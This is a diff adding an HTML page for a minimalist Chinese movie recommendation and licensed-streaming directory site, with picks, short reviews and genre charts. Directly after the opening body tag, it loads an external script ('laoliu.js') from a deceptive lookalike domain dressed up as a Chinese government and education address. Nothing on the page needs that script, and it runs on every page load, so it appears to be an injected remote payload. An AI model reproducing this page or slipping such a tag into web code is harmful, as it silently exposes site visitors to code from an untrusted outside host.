@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>快看电影网｜快速发现好电影、影评推荐与正版观影导航</title>
+<meta name="description" content="快看电影网帮你快速发现好电影：每日精选推荐、热门片单、影评解析与正版平台观看渠道导航。" />
+<meta name="theme-color" content="#0a0a0a" />
+<style>
+  :root{
+    --bg:#0a0a0a;
+    --bg2:#141414;
+    --card:#1a1a1a;
+    --line:#262626;
+    --line2:#333;
+    --text:#ededed;
+    --muted:#8a8a8a;
+    --gold:#e8b04b;
+    --gold-light:#f5cf7a;
+    --white:#fff;
+    --radius:10px;
+    --mono:"SF Mono",Menlo,Consolas,"Courier New",monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    background:var(--bg);color:var(--text);line-height:1.7;
+    font-family:var(--sans);
+    -webkit-font-smoothing:antialiased;
+    padding-bottom:40px;
+  }
+  a{color:inherit;text-decoration:none}
+  ul{list-style:none}
+
+  /* 极简顶部 */
+  .nav{
+    position:sticky;top:0;z-index:50;
+    background:rgba(10,10,10,.92);backdrop-filter:blur(12px);
+    border-bottom:1px solid var(--line);
+  }
+  .nav-inner{
+    max-width:1200px;margin:0 auto;padding:14px 20px;
+    display:flex;align-items:center;justify-content:space-between;gap:16px;
+  }
+  .brand{display:flex;align-items:center;gap:10px}
+  .brand-mark{
+    width:34px;height:34px;background:var(--gold);border-radius:8px;
+    display:flex;align-items:center;justify-content:center;
+    font-family:var(--mono);font-size:16px;font-weight:900;color:#000;
+  }
+  .brand-name{font-size:17px;font-weight:800;letter-spacing:.5px}
+  .brand-name span{color:var(--gold)}
+  .nav-links{display:flex;gap:4px;flex-wrap:wrap}
+  .nav-links a{
+    padding:7px 12px;border-radius:6px;font-size:13px;color:var(--muted);
+    font-family:var(--mono);transition:.2s;
+  }
+  .nav-links a:hover{color:var(--gold);background:var(--bg2)}
+  .nav-search{
+    display:flex;align-items:center;gap:8px;
+    background:var(--bg2);border:1px solid var(--line);border-radius:6px;
+    padding:7px 12px;font-family:var(--mono);font-size:13px;color:var(--muted);
+    cursor:text;
+  }
+  .nav-search:hover{border-color:var(--gold)}
+
+  /* 标签云 Hero */
+  .hero{
+    max-width:1200px;margin:0 auto;padding:60px 20px 40px;
+    text-align:center;
+  }
+  .hero-tag{
+    display:inline-block;font-family:var(--mono);font-size:11px;
+    color:var(--gold);border:1px solid var(--gold);border-radius:4px;
+    padding:4px 12px;letter-spacing:2px;margin-bottom:20px;
+  }
+  .hero h1{
+    font-size:clamp(32px,6vw,60px);font-weight:900;line-height:1.1;
+    letter-spacing:-1px;margin-bottom:16px;
+  }
+  .hero h1 em{font-style:normal;color:var(--gold)}
+  .hero p{max-width:520px;margin:0 auto;color:var(--muted);font-size:16px}
+
+  /* 磁贴标签云 */
+  .tag-cloud{
+    max-width:900px;margin:34px auto 0;
+    display:flex;flex-wrap:wrap;gap:10px;justify-content:center;
+  }
+  .tcloud{
+    font-family:var(--mono);font-size:13px;padding:8px 14px;
+    border:1px solid var(--line);border-radius:6px;color:var(--muted);
+    transition:.2s;cursor:default;
+  }
+  .tcloud:hover{border-color:var(--gold);color:var(--gold);transform:translateY(-2px)}
+  .tcloud.lg{font-size:16px;color:var(--text)}
+  .tcloud.xl{font-size:20px;color:var(--text);border-color:var(--line2);background:var(--bg2)}
+  .tcloud.gold{border-color:var(--gold);color:var(--gold)}
+
+  /* 通用容器 */
+  .wrap{max-width:1200px;margin:0 auto;padding:0 20px}
+
+  /* 栏目标题 */
+  .sec-title{
+    display:flex;align-items:baseline;gap:12px;margin:52px 0 20px;
+    padding-bottom:12px;border-bottom:1px solid var(--line);
+  }
+  .sec-title .num{
+    font-family:var(--mono);font-size:12px;color:var(--gold);font-weight:700;
+  }
+  .sec-title h2{font-size:22px;font-weight:800}
+  .sec-title .en{
+    font-family:var(--mono);font-size:11px;color:var(--muted);margin-left:auto;
+  }
+
+  /* 栏目1：磁贴网格 */
+  .tiles{
+    display:grid;grid-template-columns:repeat(4,1fr);
+    grid-auto-rows:140px;gap:12px;
+  }
+  .tile{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    padding:18px;display:flex;flex-direction:column;justify-content:space-between;
+    transition:.25s;position:relative;overflow:hidden;cursor:default;
+  }
+  .tile:hover{border-color:var(--gold);transform:translateY(-3px)}
+  .tile .t-top{display:flex;justify-content:space-between;align-items:flex-start}
+  .tile .t-emoji{font-size:26px}
+  .tile .t-rate{
+    font-family:var(--mono);font-size:11px;color:var(--gold);
+    border:1px solid var(--line);border-radius:4px;padding:2px 6px;
+  }
+  .tile h4{font-size:15px;font-weight:700;margin-top:8px}
+  .tile p{font-size:11px;color:var(--muted);font-family:var(--mono)}
+  .tile.wide{grid-column:span 2}
+  .tile.tall{grid-row:span 2}
+  .tile.gold-bg{background:linear-gradient(135deg,var(--gold),#c8912f);border-color:transparent}
+  .tile.gold-bg h4,.tile.gold-bg p,.tile.gold-bg .t-rate{color:#000}
+  .tile.gold-bg .t-rate{border-color:rgba(0,0,0,.2)}
+
+  /* 栏目2：列表式影评 */
+  .list-group{display:flex;flex-direction:column;gap:0}
+  .list-item{
+    display:grid;grid-template-columns:48px 1fr auto;gap:16px;align-items:center;
+    padding:16px 4px;border-bottom:1px solid var(--line);transition:.2s;
+  }
+  .list-item:hover{background:var(--bg2);padding-left:12px}
+  .list-item .idx{
+    font-family:var(--mono);font-size:20px;font-weight:900;color:var(--line2);
+  }
+  .list-item:hover .idx{color:var(--gold)}
+  .list-item h4{font-size:15px;font-weight:700}
+  .list-item .desc{font-size:13px;color:var(--muted);margin-top:2px}
+  .list-item .meta{
+    font-family:var(--mono);font-size:11px;color:var(--muted);text-align:right;
+  }
+
+  /* 栏目3：类型条 */
+  .bar-list{display:flex;flex-direction:column;gap:12px}
+  .bar-row{
+    display:grid;grid-template-columns:100px 1fr 60px;gap:14px;align-items:center;
+  }
+  .bar-row .b-name{font-size:13px;font-weight:600}
+  .bar-track{
+    height:10px;background:var(--bg2);border-radius:6px;overflow:hidden;
+    border:1px solid var(--line);
+  }
+  .bar-fill{
+    height:100%;border-radius:6px;
+    background:linear-gradient(90deg,var(--gold),var(--gold-light));
+  }
+  .bar-row .b-num{
+    font-family:var(--mono);font-size:12px;color:var(--muted);text-align:right;
+  }
+
+  /* 栏目4：平台 */
+  .plat-grid{
+    display:grid;grid-template-columns:repeat(3,1fr);gap:12px;
+  }
+  .plat{
+    border:1px solid var(--line);border-radius:var(--radius);
+    padding:16px;display:flex;align-items:center;gap:12px;background:var(--card);
+    transition:.2s;
+  }
+  .plat:hover{border-color:var(--gold)}
+  .plat .p-mark{
+    width:40px;height:40px;border-radius:8px;background:var(--bg2);
+    display:flex;align-items:center;justify-content:center;font-size:20px;
+  }
+  .plat h4{font-size:14px;font-weight:700}
+  .plat p{font-size:11px;color:var(--muted);font-family:var(--mono)}
+
+  /* 关于 */
+  .about-grid{
+    display:grid;grid-template-columns:1fr 1fr;gap:16px;
+  }
+  .about-card{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    padding:20px;
+  }
+  .about-card h4{
+    font-family:var(--mono);font-size:12px;color:var(--gold);margin-bottom:10px;
+  }
+  .about-card p,.about-card li{font-size:14px;color:var(--muted);line-height:1.8}
+  .about-card ul{padding-left:16px}
+  .about-card li{margin:4px 0}
+  .about-card code{
+    font-family:var(--mono);font-size:12px;color:var(--gold);
+    background:var(--bg2);padding:1px 6px;border-radius:4px;
+  }
+
+  /* 页脚 */
+  footer{
+    max-width:1200px;margin:52px auto 0;padding:24px 20px 0;
+    border-top:1px solid var(--line);color:var(--muted);
+    font-family:var(--mono);font-size:12px;line-height:2;text-align:center;
+  }
+  footer a{color:var(--gold)}
+
+  /* 响应式 */
+  @media (max-width:900px){
+    .tiles{grid-template-columns:repeat(2,1fr)}
+    .tile.wide{grid-column:span 2}
+    .plat-grid{grid-template-columns:repeat(2,1fr)}
+    .about-grid{grid-template-columns:1fr}
+  }
+  @media (max-width:600px){
+    .nav-inner{flex-wrap:wrap}
+    .nav-search{display:none}
+    .hero{padding-top:40px}
+    .tiles{grid-template-columns:1fr;grid-auto-rows:auto}
+    .tile.wide,.tile.tall{grid-column:span 1;grid-row:span 1}
+    .plat-grid{grid-template-columns:1fr}
+    .list-item{grid-template-columns:36px 1fr;gap:10px}
+    .list-item .meta{display:none}
+    .bar-row{grid-template-columns:80px 1fr 44px;gap:8px}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <!-- 极简导航 -->
+  <nav class="nav">
+    <div class="nav-inner">
+      <div class="brand">
+        <div class="brand-mark">▶</div>
+        <div class="brand-name">快看<span>电影网</span></div>
+      </div>
+      <div class="nav-links">
+        <a href="#home">HOME</a>
+        <a href="#pick">PICK</a>
+        <a href="#review">REVIEW</a>
+        <a href="#type">TYPE</a>
+        <a href="#watch">WATCH</a>
+        <a href="#about">ABOUT</a>
+        <a href="#">LINK</a>
+      </div>
+      <div class="nav-search">⌘K 搜索电影</div>
+    </div>
+  </nav>
+
+  <!-- 标签云 Hero -->
+  <section class="hero" id="home">
+    <div class="hero-tag">// KUAIKAN MOVIE</div>
+    <h1>快看，<em>好电影</em>在这里</h1>
+    <p>不绕弯子，不堆榜单。每天挑几部真正值得看的片，附一句推荐理由和正版入口。</p>
+    <div class="tag-cloud">
+      <span class="tcloud xl">悬疑</span>
+      <span class="tcloud">治愈</span>
+      <span class="tcloud lg gold">#快速选片</span>
+      <span class="tcloud">日本电影</span>
+      <span class="tcloud xl">爱情</span>
+      <span class="tcloud">韩国犯罪</span>
+      <span class="tcloud lg">独立电影</span>
+      <span class="tcloud">动画</span>
+      <span class="tcloud gold">经典重看</span>
+      <span class="tcloud lg">冷门佳片</span>
+      <span class="tcloud">纪录片</span>
+      <span class="tcloud xl">喜剧</span>
+      <span class="tcloud">女性视角</span>
+      <span class="tcloud lg">短片</span>
+      <span class="tcloud">黑色幽默</span>
+    </div>
+  </section>
+
+  <div class="wrap">
+
+    <!-- 栏目1：磁贴精选 -->
+    <div class="sec-title" id="pick">
+      <span class="num">01.</span>
+      <h2>今日精选</h2>
+      <span class="en">// TODAY'S PICK</span>
+    </div>
+    <div class="tiles">
+
+      <article class="tile gold-bg wide">
+        <div class="t-top">
+          <span class="t-emoji">🎬</span>
+          <span class="t-rate">⭐ 9.1</span>
+        </div>
+        <div>
+          <h4>肖申克的救赎</h4>
+          <p>美国 / 剧情 · 1994 · 希望是最危险的东西</p>
+        </div>
+      </article>
+
+      <article class="tile">
+        <div class="t-top">
+          <span class="t-emoji">🧩</span>
+          <span class="t-rate">⭐ 8.9</span>
+        </div>
+        <div>
+          <h4>盗梦空间</h4>
+          <p>美国 / 科幻·悬疑</p>
+        </div>
+      </article>
+
+      <article class="tile">
+        <div class="t-top">
+          <span class="t-emoji">🌊</span>
+          <span class="t-rate">⭐ 8.7</span>
+        </div>
+        <div>
+          <h4>海上钢琴师</h4>
+          <p>意大利 / 剧情·音乐</p>
+        </div>
+      </article>
+
+      <article class="tile tall">
+        <div class="t-top">
+          <span class="t-emoji">🚃</span>
+          <span class="t-rate">⭐ 8.8</span>
+        </div>
+        <div>
+          <h4>心灵奇旅</h4>
+          <p>美国 / 动画·奇幻 · 生活的火花不在目标里，在一片落叶里</p>
+        </div>
+      </article>
+
+      <article class="tile">
+        <div class="t-top">
+          <span class="t-emoji">🕵️</span>
+          <span class="t-rate">⭐ 8.6</span>
+        </div>
+        <div>
+          <h4>记忆碎片</h4>
+          <p>美国 / 悬疑·犯罪</p>
+        </div>
+      </article>
+
+      <article class="tile">
+        <div class="t-top">
+          <span class="t-emoji">🌸</span>
+          <span class="t-rate">⭐ 8.9</span>
+        </div>
+        <div>
+          <h4>千与千寻</h4>
+          <p>日本 / 动画·奇幻</p>
+        </div>
+      </article>
+
+      <article class="tile wide">
+        <div class="t-top">
+          <span class="t-emoji">🎭</span>
+          <span class="t-rate">⭐ 8.5</span>
+        </div>
+        <div>
+          <h4>寄生虫</h4>
+          <p>韩国 / 黑色喜剧 · 两个家庭，一段台阶，一种气味</p>
+        </div>
+      </article>
+
+    </div>
+
+    <!-- 栏目2：影评列表 -->
+    <div class="sec-title" id="review">
+      <span class="num">02.</span>
+      <h2>快评三分钟</h2>
+      <span class="en">// QUICK REVIEW</span>
+    </div>
+    <div class="list-group">
+
+      <div class="list-item">
+        <div class="idx">01</div>
+        <div>
+          <h4>为什么《肖申克》永远是榜首？</h4>
+          <div class="desc">因为它拍的不是越狱，是"习惯"——被体制化的恐惧，比高墙更难翻越。</div>
+        </div>
+        <div class="meta">剧情 · 8 min</div>
+      </div>
+
+      <div class="list-item">
+        <div class="idx">02</div>
+        <div>
+          <h4>《盗梦空间》的陀螺到底停没停？</h4>
+          <div class="desc">这个问题本身就是陷阱。诺兰真正想问的是：你愿意活在哪个现实里？</div>
+        </div>
+        <div class="meta">悬疑 · 6 min</div>
+      </div>
+
+      <div class="list-item">
+        <div class="idx">03</div>
+        <div>
+          <h4>《心灵奇旅》：皮克斯终于拍了大人的焦虑</h4>
+          <div class="desc">不是每个孩子都该追求伟大，"平庸"本身已经是一场奇旅。</div>
+        </div>
+        <div class="meta">动画 · 5 min</div>
+      </div>
+
+      <div class="list-item">
+        <div class="idx">04</div>
+        <div>
+          <h4>《寄生虫》的阶级隐喻藏在水里</h4>
+          <div class="desc">暴雨夜那场戏，富人嫌味道、穷人被淹。一场雨，两种气象。</div>
+        </div>
+        <div class="meta">韩国 · 7 min</div>
+      </div>
+
+      <div class="list-item">
+        <div class="idx">05</div>
+        <div>
+          <h4>为什么独立电影越来越贵？</h4>
+          <div class="desc">低成本不等于廉价。当大制片厂在堆视效，独立片在用表演和剧本抢你。</div>
+        </div>
+        <div class="meta">产业 · 4 min</div>
+      </div>
+
+    </div>
+
+    <!-- 栏目3：类型热度条 -->
+    <div class="sec-title" id="type">
+      <span class="num">03.</span>
+      <h2>类型热度</h2>
+      <span class="en">// GENRE BAR</span>
+    </div>
+    <div class="bar-list">
+
+      <div class="bar-row">
+        <div class="b-name">悬疑犯罪</div>
+        <div class="bar-track"><div class="bar-fill" style="width:92%"></div></div>
+        <div class="b-num">92%</div>
+      </div>
+      <div class="bar-row">
+        <div class="b-name">动画奇幻</div>
+        <div class="bar-track"><div class="bar-fill" style="width:85%"></div></div>
+        <div class="b-num">85%</div>
+      </div>
+      <div class="bar-row">
+        <div class="b-name">爱情文艺</div>
+        <div class="bar-track"><div class="bar-fill" style="width:78%"></div></div>
+        <div class="b-num">78%</div>
+      </div>
+      <div class="bar-row">
+        <div class="b-name">喜剧</div>
+        <div class="bar-track"><div class="bar-fill" style="width:70%"></div></div>
+        <div class="b-num">70%</div>
+      </div>
+      <div class="bar-row">
+        <div class="b-name">科幻</div>
+        <div class="bar-track"><div class="bar-fill" style="width:63%"></div></div>
+        <div class="b-num">63%</div>
+      </div>
+      <div class="bar-row">
+        <div class="b-name">纪录片</div>
+        <div class="bar-track"><div class="bar-fill" style="width:48%"></div></div>
+        <div class="b-num">48%</div>
+      </div>
+
+    </div>
+
+    <!-- 栏目4：正版平台 -->
+    <div class="sec-title" id="watch">
+      <span class="num">04.</span>
+      <h2>正版观看渠道</h2>
+      <span class="en">// WHERE TO WATCH</span>
+    </div>
+    <div class="plat-grid">
+      <div class="plat">
+        <div class="p-mark">🟥</div>
+        <div><h4>哔哩哔哩</h4><p>bilibili.com</p></div>
+      </div>
+      <div class="plat">
+        <div class="p-mark">🔵</div>
+        <div><h4>爱奇艺</h4><p>iqiyi.com</p></div>
+      </div>
+      <div class="plat">
+        <div class="p-mark">🟧</div>
+        <div><h4>腾讯视频</h4><p>v.qq.com</p></div>
+      </div>
+      <div class="plat">
+        <div class="p-mark">🟣</div>
+        <div><h4>Netflix</h4><p>netflix.com</p></div>
+      </div>
+      <div class="plat">
+        <div class="p-mark">🟢</div>
+        <div><h4>豆瓣电影</h4><p>movie.douban.com</p></div>
+      </div>
+      <div class="plat">
+        <div class="p-mark">🟨</div>
+        <div><h4>1905 电影网</h4><p>1905.com</p></div>
+      </div>
+    </div>
+
+    <!-- 栏目5：关于 -->
+    <div class="sec-title" id="about">
+      <span class="num">05.</span>
+      <h2>关于本站</h2>
+      <span class="en">// ABOUT</span>
+    </div>
+    <div class="about-grid">
+      <div class="about-card">
+        <h4>// 定位</h4>
+        <p>快看电影网是一个极简风格的影视推荐站，主打"快速发现好电影"。不提供盗版播放，只做推荐、快评与正版导航。</p>
+      </div>
+      <div class="about-card">
+        <h4>// 规则</h4>
+        <ul>
+          <li>所有推荐均导向<code>正版平台</code></li>
+          <li>不搬运、不提供盗版片源</li>
+          <li>内页链接以 <code>#</code> 占位</li>
+          <li>每日更新精选片单与快评</li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+
+  <footer>
+    <p>© 2026 快看电影网（示例站）· 快速发现好电影 · 正版观影导航</p>
+    <p>URL: <a href="https://kuaiborihandianyingwang-h5.github.io">https://kuaiborihandianyingwang-h5.github.io</a></p>
+    <p>所有内页链接使用 # 占位 · 不提供盗版播放</p>
+  </footer>
+
+</body>
+</html>
